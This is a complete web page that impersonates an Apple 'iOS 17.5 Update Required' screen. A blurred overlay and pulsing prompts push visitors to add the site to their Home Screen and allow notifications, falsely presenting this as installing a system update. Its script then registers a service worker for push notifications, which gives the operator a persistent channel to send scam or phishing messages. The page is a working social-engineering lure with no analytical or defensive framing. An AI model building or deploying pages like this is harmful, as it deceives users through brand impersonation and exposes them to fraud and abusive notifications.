<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iOS 17.5 Update Required</title>
  <link rel="manifest" href="/manifest.json">
  <meta name="theme-color" content="#f2f2f7">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <link rel="apple-touch-icon" href="/icon.png">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto;
      background: linear-gradient(135deg, #e0e7ff, #c3dafe);
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    .content {
      text-align: center;
      padding: 30px;
      background: white;
      border-radius: 20px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.15);
      z-index: 1;
      max-width: 90%;
    }
    .blur {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      backdrop-filter: blur(12px);
      background: rgba(255,255,255,0.2);
      z-index: 2;
    }
    .popup {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(135deg, #ffffff, #f0f4ff);
      padding: 25px;
      border-radius: 16px;
      text-align: left;
      z-index: 3;
      box-shadow: 0 10px 40px rgba(0,0,0,0.25);
      width: 85%;
      max-width: 340px;
      animation: glow 2s ease-in-out infinite;
    }
    @keyframes glow {
      0%, 100% { box-shadow: 0 10px 40px rgba(49,126,251,0.3); }
      50% { box-shadow: 0 10px 40px rgba(49,126,251,0.6); }
    }
    .arrow {
      position: absolute;
      bottom: 80px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 56px;
      color: #317EFB;
      animation: bounce 1.2s infinite;
      z-index: 4;
    }
    @keyframes bounce {
      0%, 100% { transform: translateX(-50%) translateY(0); }
      50% { transform: translateX(-50%) translateY(12px); }
    }
    button {
      margin-top: 20px;
      padding: 12px 30px;
      font-size: 1.1em;
      background: linear-gradient(135deg, #317EFB, #1a5cd8);
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: transform 0.2s;
      animation: pulse 2s infinite;
      width: 100%;
      text-align: center;
    }
    button:hover {
      transform: scale(1.05);
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.08); }
    }
    .spinner {
      width: 80px;
      height: 80px;
      border: 6px solid #e0e0e0;
      border-top: 6px solid #317EFB;
      border-radius: 50%;
      animation: spin 1.5s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h1 {
      font-size: 1.8em;
      color: #1a1a1a;
      margin-bottom: 10px;
    }
    h2 {
      font-size: 1.5em;
      color: #317EFB;
      margin-bottom: 15px;
      text-align: center;
    }
    p {
      font-size: 1em;
      color: #333;
      line-height: 1.5;
      margin: 10px 0;
    }
    .highlight {
      color: #317EFB;
      font-weight: bold;
    }
    ol {
      padding-left: 20px;
      margin: 10px 0;
      font-size: 0.95em;
      color: #333;
    }
    li {
      margin-bottom: 8px;
    }
  </style>
</head>
<body>
  <div class="content">
    <h1>iOS 17.5 Update Required</h1>
    <p>Your device needs the <span class="highlight">iOS 17.5</span> update for enhanced <span class="highlight">security</span>, <span class="highlight">performance</span>, and new features.</p>
    <div class="spinner"></div>
  </div>
  <div class="blur"></div>
  <div class="popup" id="popupStep">
    <h2>üîí Install Update Now</h2>
    <p>To update to <span class="highlight">iOS 17.5</span>, add this app to your <span class="highlight">Home Screen</span> and allow <span class="highlight">notifications</span>:</p>
    <ol>
      <li>Tap the <span class="highlight">Share</span> button below (square with an arrow).</li>
      <li>Select <span class="highlight">Add to Home Screen</span> and tap <span class="highlight">Add</span>.</li>
      <li>Allow <span class="highlight">Notifications</span> when prompted to receive update alerts.</li>
    </ol>
    <p>This ensures you stay secure and updated. Act now!</p>
    <button onclick="dismissPrompt()">I‚Äôve Added It!</button>
  </div>
  <div class="arrow">‚¨áÔ∏è</div>
  <script>
    let deferredPrompt;
    const popup = document.getElementById('popupStep');
    let notificationPermissionRequested = false;

    // Detect if the app is running in standalone mode
    function isStandalone() {
      return (window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true);
    }

    // Request notification permission
    async function requestNotificationPermission() {
      if (!('Notification' in window)) {
        console.log('Notifications not supported');
        return;
      }
      if (Notification.permission === 'granted') {
        return;
      }
      if (!notificationPermissionRequested) {
        notificationPermissionRequested = true;
        const permission = await Notification.requestPermission();
        if (permission === 'granted') {
          console.log('Notification permission granted');
          // Register service worker for push notifications
          if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/service-worker.js').then(reg => {
              console.log('Service worker registered');
            }).catch(err => {
              console.error('Service worker registration failed:', err);
            });
          }
        } else {
          alert('Please allow notifications to receive critical iOS 17.5 update alerts.');
        }
      }
    }

    // If already in standalone mode, request notifications
    if (isStandalone()) {
      popup.style.display = 'none';
      document.querySelector('.blur').style.display = 'none';
      document.querySelector('.arrow').style.display = 'none';
      requestNotificationPermission();
    }

    // Handle the beforeinstallprompt event for Chrome/Android
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      deferredPrompt = e;
    });

    // Dismiss the prompt (only if standalone and notifications allowed)
    function dismissPrompt() {
      if (isStandalone()) {
        requestNotificationPermission();
        if (Notification.permission === 'granted') {
          popup.style.display = 'none';
          document.querySelector('.blur').style.display = 'none';
          document.querySelector('.arrow').style.display = 'none';
        } else {
          alert('Please allow notifications to complete the iOS 17.5 update setup.');
        }
      } else {
        alert('To update to iOS 17.5, add the app to your Home Screen. Tap the Share button, then select Add to Home Screen.');
      }
    }

    // Hide prompt after app is installed
    window.addEventListener('appinstalled', () => {
      requestNotificationPermission();
      if (Notification.permission === 'granted') {
        popup.style.display = 'none';
        document.querySelector('.blur').style.display = 'none';
        document.querySelector('.arrow').style.display = 'none';
      }
    });
  </script>
</body>
</html>
